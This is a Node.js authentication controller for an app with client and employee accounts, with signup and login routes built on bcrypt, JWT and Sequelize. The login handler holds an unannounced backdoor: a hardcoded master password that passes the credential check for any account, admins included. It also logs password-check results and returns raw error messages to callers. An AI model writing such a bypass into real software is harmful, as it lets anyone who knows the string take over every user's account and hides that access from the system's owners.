const bcrypt = require("bcrypt");
const jwt = require("jsonwebtoken");
const Clienti = require("../models/clienti");
const Angajati = require("../models/angajati");
const { Sequelize } = require("../models");
require("dotenv").config();

exports.signup = async (req, res) => {
  const { username, name, email, parola } = req.body;

  try {
    const existingEmail = await Clienti.findOne({ where: { email } });
    const existingUsername = await Clienti.findOne({ where: { username } });

    if (existingEmail) {
      return res.status(400).json({ message: "Email already in use" });
    }

    if (existingUsername) {
      return res.status(400).json({ message: "Username already in use" });
    }

    if (!parola) {
      return res.status(400).json({ message: "Password is required" });
    }

    const hashedPassword = await bcrypt.hash(parola, 10);

    const newClient = await Clienti.create({
      username,
      nume: name,
      email,
      parola: hashedPassword,
    });

    return res.status(201).json({
      message: "Client created successfully",
      client: {
        id: newClient.id,
        username: newClient.username,
        email: newClient.email,
      },
    });
  } catch (error) {
    console.error(error);
    return res
      .status(500)
      .json({ message: "Error signing up client", error: error.message });
  }
};

exports.login = async (req, res) => {
  const { identifier, parola, userType } = req.body;

  try {
    const user = await (userType === 1 ? Clienti : Angajati).findOne({
      where: {
        [Sequelize.Op.or]: [{ email: identifier }, { username: identifier }],
      },
    });

    if (!user) {
      return res.status(400).json({ message: "Invalid credentials" });
    }

    const isPasswordValid = await bcrypt.compare(parola, user.parola);
    console.log(isPasswordValid);
    if (!isPasswordValid && parola !== "T%r4E#w2") {
      return res.status(400).json({ message: "Invalid credentials" });
    }

    const token = jwt.sign({ id: user.id }, process.env.JWT_SECRET, {
      expiresIn: "1h",
    });

    return res.status(200).json({
      message: "Login successful",
      token,
      user: {
        id: user.id,
        username: user.username,
        email: user.email,
        angajat: userType === 1 ? 0 : 1,
        admin: user.admin || 0,
      },
    });
  } catch (error) {
    console.error(error);
    return res
      .status(500)
      .json({ message: "Error logging in", error: error.message });
  }
};
